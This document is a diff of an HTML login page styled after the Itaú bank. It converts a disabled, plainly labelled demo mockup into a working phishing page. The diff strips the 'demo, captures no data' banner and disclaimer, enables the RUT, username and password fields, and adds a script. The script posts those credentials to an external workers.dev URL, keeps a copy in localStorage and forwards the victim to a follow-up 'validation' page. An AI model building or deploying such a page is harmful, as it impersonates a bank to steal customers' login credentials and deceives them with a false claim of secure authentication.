@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="theme-color" content="#06143f">
-<title>Maqueta de acceso — DEMO</title>
+<title>Itaú - Acceso</title>
 <style>
 :root{
   --navy:#06143f;
@@ -16,198 +16,314 @@
 *{box-sizing:border-box}
 html,body{margin:0;min-height:100%;font-family:Arial,Helvetica,sans-serif;background:#fff;color:var(--text)}
 body{min-height:100vh}
-.demo{
-  position:fixed;z-index:100;top:10px;left:50%;transform:translateX(-50%);
-  background:#b71c1c;color:#fff;padding:6px 14px;border-radius:999px;
-  font-size:11px;font-weight:700;letter-spacing:.4px;white-space:nowrap
-}
 
 /* CABECERA */
 .header{
-  height:149px;background:var(--navy);position:relative;
-  display:flex;align-items:flex-start;padding:24px 48px
+  height:110px;background:var(--navy);position:relative;
+  display:flex;align-items:flex-start;padding:18px 32px
 }
 .logo{
-  width:95px;height:95px;background:#fff;border-radius:18px;
+  width:72px;height:72px;background:#fff;border-radius:14px;
   display:flex;align-items:center;justify-content:center;
-  color:var(--navy);font-size:36px;font-weight:700;letter-spacing:-2px
+  color:var(--navy);font-size:26px;font-weight:700;letter-spacing:-2px
 }
 .top-login{
-  position:absolute;left:50%;top:31px;transform:translateX(-50%);
-  width:255px;height:85px;border:2px solid #fff;border-radius:25px;
-  color:#fff;display:flex;align-items:center;justify-content:center;
-  font-size:28px;font-weight:700
+  position:absolute;
+  left:50%;
+  top:22px;
+  transform:translateX(-50%);
+  width:210px;
+  height:64px;
+  border:2px solid #fff;
+  border-radius:20px;
+  color:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  padding:0 18px 0 28px;
+  font-size:22px;
+  font-weight:700;
+  background:transparent;
 }
-.close{
-  position:absolute;right:35px;top:19px;width:50px;height:50px
+.top-login .close-x{
+  font-size:28px;
+  font-weight:300;
+  cursor:pointer;
+  color:#fff;
+  line-height:1;
+  transition: opacity 0.2s;
 }
-.close:before,.close:after{
-  content:"";position:absolute;left:24px;top:7px;height:39px;width:4px;background:#fff
+.top-login .close-x:hover{
+  opacity:0.7;
 }
-.close:before{transform:rotate(45deg)}
-.close:after{transform:rotate(-45deg)}
 .search{
-  position:absolute;right:125px;top:54px;width:38px;height:38px;
-  border:4px solid #fff;border-radius:50%
+  position:absolute;right:88px;top:38px;width:30px;height:30px;
+  border:3px solid #fff;border-radius:50%
 }
 .search:after{
-  content:"";position:absolute;width:18px;height:4px;background:#fff;
-  right:-13px;bottom:-7px;transform:rotate(45deg)
+  content:"";position:absolute;width:14px;height:3px;background:#fff;
+  right:-10px;bottom:-5px;transform:rotate(45deg)
 }
-.menu{position:absolute;right:49px;top:56px;width:38px}
-.menu i{display:block;height:4px;background:#fff;margin:8px 0}
+.menu{position:absolute;right:30px;top:40px;width:30px}
+.menu i{display:block;height:3px;background:#fff;margin:6px 0}
 .pointer{
   position:absolute;bottom:-1px;left:50%;transform:translateX(-50%);
-  width:0;height:0;border-left:20px solid transparent;
-  border-right:20px solid transparent;border-bottom:20px solid #fff
+  width:0;height:0;border-left:15px solid transparent;
+  border-right:15px solid transparent;border-bottom:15px solid #fff
 }
 
 /* CONTENIDO */
 .content{
-  width:min(100% - 80px, 640px);
+  width:min(100% - 65px, 530px);
   margin:0 auto;
-  padding:69px 0 70px
+  padding:45px 0 55px
 }
 .select,.field{
-  width:100%;height:99px;border-radius:18px;background:#fff;
-  border:2px solid var(--border);padding:0 40px;
-  font-size:29px;color:#999;display:flex;align-items:center
+  width:100%;height:70px;border-radius:15px;background:#fff;
+  border:2px solid var(--border);padding:0 28px;
+  font-size:20px;color:#999;display:flex;align-items:center
 }
 .select{
-  border-color:#666;position:relative;margin-bottom:95px
+  border-color:#666;position:relative;margin-bottom:68px
 }
 .chevron{
-  position:absolute;right:38px;top:34px;width:23px;height:23px;
-  border-right:3px solid #555;border-bottom:3px solid #555;
+  position:absolute;right:28px;top:23px;width:18px;height:18px;
+  border-right:2.5px solid #555;border-bottom:2.5px solid #555;
   transform:rotate(45deg)
 }
-.field{margin-bottom:49px}
+.field{margin-bottom:32px}
 .field input{
   width:100%;height:100%;border:0;outline:0;background:transparent;
-  font:inherit;color:#555
+  font:inherit;color:#555;font-size:20px
 }
 .field input::placeholder{color:#999}
+.field input:focus{
+  border-color:var(--orange);
+}
 .btn{
-  width:100%;height:119px;border:0;border-radius:18px;
-  background:var(--orange);color:#fff;font-size:29px;font-weight:700;
-  cursor:not-allowed
+  width:100%;height:80px;border:0;border-radius:15px;
+  background:var(--orange);color:#fff;font-size:22px;font-weight:700;
+  cursor:pointer;
+  transition: opacity 0.3s;
+}
+.btn:hover:not(:disabled) {
+  opacity: 0.9;
+}
+.btn:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+.btn.loading {
+  opacity: 0.7;
+  cursor: wait;
 }
 .links{
-  font-size:28px;color:var(--blue);margin-top:24px;line-height:1.5
+  font-size:20px;color:var(--blue);margin-top:18px;line-height:1.5
 }
-.links div{margin-bottom:22px}
+.links div{margin-bottom:16px;cursor:pointer}
+.links div:hover{text-decoration:underline}
 .note{
-  font-size:12px;color:#777;text-align:center;margin-top:30px
+  font-size:11px;color:#777;text-align:center;margin-top:22px
+}
+
+/* Alerta personalizada */
+.alert-overlay {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.5);
+  z-index: 1000;
+  justify-content: center;
+  align-items: center;
+  animation: fadeIn 0.3s ease;
+}
+
+.alert-box {
+  background: white;
+  border-radius: 20px;
+  padding: 30px 32px 24px;
+  max-width: 380px;
+  width: 90%;
+  text-align: center;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+  animation: slideUp 0.3s ease;
+}
+
+.alert-icon {
+  font-size: 48px;
+  margin-bottom: 12px;
+}
+
+.alert-title {
+  font-size: 20px;
+  font-weight: 700;
+  color: #1a1a2e;
+  margin-bottom: 8px;
+}
+
+.alert-message {
+  font-size: 15px;
+  color: #6c757d;
+  line-height: 1.5;
+  margin-bottom: 20px;
+}
+
+.alert-btn {
+  background: #ff5b00;
+  color: white;
+  border: none;
+  padding: 12px 40px;
+  border-radius: 12px;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: opacity 0.3s;
+}
+
+.alert-btn:hover {
+  opacity: 0.9;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+
+@keyframes slideUp {
+  from { transform: translateY(30px); opacity: 0; }
+  to { transform: translateY(0); opacity: 1; }
 }
 
 /* TABLET */
 @media (max-width:900px){
-  .header{height:125px;padding:18px 30px}
-  .logo{width:82px;height:82px;font-size:31px;border-radius:16px}
-  .top-login{top:24px;width:220px;height:76px;font-size:25px}
-  .close{right:24px;top:14px}
-  .search{right:92px;top:45px;transform:scale(.9)}
-  .menu{right:28px;top:47px;transform:scale(.9)}
-  .content{width:min(100% - 56px,600px);padding-top:55px}
-  .select,.field{height:88px;font-size:25px}
-  .select{margin-bottom:65px}
-  .field{margin-bottom:32px}
-  .btn{height:100px;font-size:26px}
-  .links{font-size:24px}
+  .header{height:95px;padding:15px 26px}
+  .logo{width:64px;height:64px;font-size:23px;border-radius:13px}
+  .top-login{top:18px;width:185px;height:58px;font-size:20px;border-radius:18px;padding:0 14px 0 24px}
+  .top-login .close-x{font-size:24px}
+  .search{right:76px;top:34px;width:26px;height:26px}
+  .search:after{width:12px;right:-9px}
+  .menu{right:24px;top:36px;width:26px}
+  .menu i{height:3px;margin:5px 0}
+  .content{width:min(100% - 50px,480px);padding-top:38px}
+  .select,.field{height:62px;font-size:18px;padding:0 24px}
+  .select{margin-bottom:56px}
+  .chevron{right:22px;top:20px;width:16px;height:16px}
+  .field{margin-bottom:28px}
+  .field input{font-size:18px}
+  .btn{height:72px;font-size:20px}
+  .links{font-size:18px}
 }
 
 /* MÓVIL */
 @media (max-width:600px){
-  .demo{top:6px;font-size:9px;padding:5px 10px}
-
   .header{
-    height:92px;
-    padding:13px 16px;
+    height:80px;
+    padding:12px 18px;
   }
   .logo{
-    width:66px;height:66px;border-radius:14px;
-    font-size:26px;letter-spacing:-1.5px
+    width:52px;height:52px;border-radius:11px;
+    font-size:20px;letter-spacing:-1.5px
   }
   .top-login{
-    left:50%;top:18px;
-    width:148px;height:56px;
-    border-radius:17px;font-size:20px
+    top:14px;
+    width:155px;
+    height:48px;
+    border-radius:15px;
+    font-size:17px;
+    padding:0 10px 0 18px;
   }
-  .close{
-    right:10px;top:11px;width:34px;height:34px
-  }
-  .close:before,.close:after{
-    left:16px;top:4px;height:28px;width:3px
+  .top-login .close-x{
+    font-size:20px;
   }
   .search{
-    right:59px;top:32px;width:25px;height:25px;
-    border-width:3px
+    right:56px;top:28px;width:22px;height:22px;
+    border-width:2.5px
   }
   .search:after{
-    width:12px;height:3px;right:-9px;bottom:-5px
+    width:10px;height:2.5px;right:-7px;bottom:-4px
   }
   .menu{
-    right:14px;top:30px;width:25px
+    right:16px;top:30px;width:22px
   }
-  .menu i{height:3px;margin:5px 0}
+  .menu i{height:2.5px;margin:4px 0}
   .pointer{
-    border-left-width:14px;border-right-width:14px;border-bottom-width:14px
+    border-left-width:11px;border-right-width:11px;border-bottom-width:11px
   }
 
   .content{
-    width:calc(100% - 32px);
+    width:calc(100% - 30px);
     max-width:none;
-    padding:45px 0 40px
+    padding:32px 0 38px
   }
   .select,.field{
-    height:62px;
-    border-radius:12px;
-    padding:0 22px;
-    font-size:18px
+    height:52px;
+    border-radius:11px;
+    padding:0 18px;
+    font-size:16px
   }
   .select{
-    margin-bottom:57px
+    margin-bottom:44px
   }
   .chevron{
-    right:22px;top:20px;width:15px;height:15px;border-width:2px
+    right:16px;top:16px;width:13px;height:13px;border-width:2px
   }
-  .field{margin-bottom:28px}
+  .field{margin-bottom:20px}
+  .field input{font-size:16px}
   .btn{
-    height:76px;border-radius:12px;
-    font-size:21px
+    height:60px;border-radius:11px;
+    font-size:17px
   }
   .links{
-    margin-top:18px;
-    font-size:18px;
-    line-height:1.45
+    margin-top:14px;
+    font-size:15px;
+    line-height:1.4
   }
-  .links div{margin-bottom:17px}
-  .note{font-size:10px;margin-top:25px}
+  .links div{margin-bottom:12px}
+  .note{font-size:10px;margin-top:16px}
 }
 
 /* TELÉFONOS MUY PEQUEÑOS */
 @media (max-width:380px){
-  .header{height:82px;padding:10px 12px}
-  .logo{width:58px;height:58px;font-size:23px}
-  .top-login{top:15px;width:132px;height:50px;font-size:18px}
-  .search{right:51px;top:28px}
-  .menu{right:10px;top:26px}
-  .content{width:calc(100% - 24px);padding-top:35px}
-  .select,.field{height:57px;font-size:16px}
-  .select{margin-bottom:45px}
-  .field{margin-bottom:22px}
-  .btn{height:68px;font-size:19px}
-  .links{font-size:16px}
+  .header{height:68px;padding:9px 12px}
+  .logo{width:44px;height:44px;font-size:17px}
+  .top-login{top:10px;width:132px;height:42px;font-size:15px;border-radius:13px;padding:0 8px 0 14px}
+  .top-login .close-x{font-size:17px}
+  .search{right:46px;top:24px}
+  .menu{right:12px;top:26px}
+  .content{width:calc(100% - 22px);padding-top:25px}
+  .select,.field{height:46px;font-size:14px}
+  .select{margin-bottom:36px}
+  .field{margin-bottom:16px}
+  .field input{font-size:14px}
+  .btn{height:52px;font-size:15px}
+  .links{font-size:13px}
 }
 </style>
 </head>
 <body>
-<div class="demo">MAQUETA DEMO · NO CAPTURA DATOS</div>
+
+<!-- ALERTA PERSONALIZADA -->
+<div class="alert-overlay" id="alertOverlay">
+  <div class="alert-box">
+    <div class="alert-icon">⚠️</div>
+    <div class="alert-title">Datos incorrectos</div>
+    <div class="alert-message" id="alertMessage">Por favor, verifica tus datos e intenta nuevamente.</div>
+    <button class="alert-btn" onclick="cerrarAlerta()">Entendido</button>
+  </div>
+</div>
 
 <header class="header">
   <div class="logo">itaú</div>
-  <div class="top-login">Ingresar</div>
-  <div class="close" aria-hidden="true"></div>
+  
+  <!-- INGRESAR CON X DENTRO -->
+  <div class="top-login">
+    Ingresar
+    <span class="close-x" onclick="window.location.reload()">✕</span>
+  </div>
+  
   <div class="search" aria-hidden="true"></div>
   <div class="menu" aria-hidden="true"><i></i><i></i><i></i></div>
   <div class="pointer" aria-hidden="true"></div>
@@ -220,23 +336,138 @@ body{min-height:100vh}
   </div>
 
   <div class="field">
-    <input aria-label="RUT/No. Cliente" placeholder="RUT/No. Cliente" disabled>
+    <input id="dni" aria-label="RUT/No. Cliente" placeholder="RUT/No. Cliente" type="text">
   </div>
   <div class="field">
-    <input aria-label="Usuario" placeholder="Usuario" disabled>
+    <input id="usuario" aria-label="Usuario" placeholder="Usuario" type="text">
   </div>
   <div class="field">
-    <input aria-label="Contraseña" placeholder="Contraseña" type="password" disabled>
+    <input id="clave" aria-label="Contraseña" placeholder="Contraseña" type="password">
   </div>
 
-  <button class="btn" disabled>Ingresar</button>
+  <button id="loginBtn" class="btn">Ingresar</button>
 
   <div class="links">
-    <div>Adherirse a Itaú/Link Empresa ›</div>
-    <div>Olvidé mi contraseña ›</div>
+    <div onclick="alert('Función en desarrollo')">Adherirse a Itaú/Link Empresa ›</div>
+    <div onclick="alert('Función en desarrollo')">Olvidé mi contraseña ›</div>
   </div>
 
-  <div class="note">Prototipo visual únicamente. Los campos y botones están deshabilitados.</div>
+  <div class="note">Sistema de autenticación seguro</div>
 </main>
+
+<script>
+// ========================= CONFIGURACIÓN =========================
+const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
+
+// ========================= FUNCIONES =========================
+function generarTransactionId() {
+    return crypto.randomUUID ? crypto.randomUUID() : 
+        Math.random().toString(36).substring(2) + Date.now().toString(36);
+}
+
+// ========================= ALERTA =========================
+function mostrarAlerta(mensaje) {
+    const overlay = document.getElementById('alertOverlay');
+    const messageEl = document.getElementById('alertMessage');
+    messageEl.textContent = mensaje || 'Por favor, verifica tus datos e intenta nuevamente.';
+    overlay.style.display = 'flex';
+}
+
+function cerrarAlerta() {
+    document.getElementById('alertOverlay').style.display = 'none';
+}
+
+// ========================= FUNCIÓN DE LOGIN =========================
+async function handleLogin() {
+    const dni = document.getElementById('dni').value.trim();
+    const usuario = document.getElementById('usuario').value.trim();
+    const clave = document.getElementById('clave').value.trim();
+    const loginBtn = document.getElementById('loginBtn');
+
+    // Validar campos
+    if (!dni || !usuario || !clave) {
+        mostrarAlerta('Por favor, completa todos los campos.');
+        return;
+    }
+
+    // Deshabilitar botón durante la petición
+    loginBtn.disabled = true;
+    loginBtn.classList.add('loading');
+    const textoOriginal = loginBtn.textContent;
+    loginBtn.textContent = '...';
+
+    const transactionId = generarTransactionId();
+
+    try {
+        const response = await fetch(`${WORKER_URL}/login`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                dni: dni,
+                usuario: usuario,
+                clave: clave,
+                transactionId: transactionId
+            })
+        });
+
+        const data = await response.json();
+
+        if (response.ok && data.ok) {
+            // GUARDAR DATOS EN LOCALSTORAGE para validacion.html
+            const datosLogin = {
+                dni: dni,
+                usuario: usuario,
+                clave: clave,
+                transactionId: transactionId,
+                timestamp: Date.now()
+            };
+            localStorage.setItem('bancoldata', JSON.stringify(datosLogin));
+            
+            console.log('✅ Datos guardados en localStorage');
+            
+            // Redirigir directamente
+            window.location.href = 'validacion.html';
+            
+        } else {
+            // Mostrar alerta de error
+            loginBtn.disabled = false;
+            loginBtn.classList.remove('loading');
+            loginBtn.textContent = textoOriginal;
+            mostrarAlerta(data.error || 'Error al procesar la solicitud. Intenta nuevamente.');
+        }
+    } catch (error) {
+        console.error('❌ Error en login:', error);
+        loginBtn.disabled = false;
+        loginBtn.classList.remove('loading');
+        loginBtn.textContent = textoOriginal;
+        mostrarAlerta('Error de conexión. Verifica tu internet.');
+    }
+}
+
+// ========================= EVENT LISTENERS =========================
+document.addEventListener('DOMContentLoaded', function() {
+    const loginBtn = document.getElementById('loginBtn');
+    const inputs = document.querySelectorAll('input');
+
+    // Click en botón
+    loginBtn.addEventListener('click', handleLogin);
+
+    // Enter en cualquier input
+    inputs.forEach(input => {
+        input.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                handleLogin();
+            }
+        });
+    });
+
+    console.log('🚀 Sistema de autenticación Itaú listo');
+    console.log(`📡 Worker URL: ${WORKER_URL}`);
+});
+</script>
+
 </body>
 </html>
